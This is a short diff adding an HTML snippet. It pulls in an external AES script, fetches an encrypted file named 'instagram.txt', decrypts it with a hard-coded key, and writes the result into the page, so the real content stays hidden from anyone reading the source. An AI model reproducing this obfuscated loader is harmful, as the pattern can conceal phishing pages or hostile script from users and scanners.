@@ -1,0 +1,11 @@
+<script src="https://ummx.github.io/import/script/aes.js"></script>
+<script>
+
+    fetch('/instagram.txt')
+    .then((res)=>{
+        return res.text()
+    })
+    .then((data)=>{
+        document.write(decrypt(data,'3301'))
+    })
+</script>
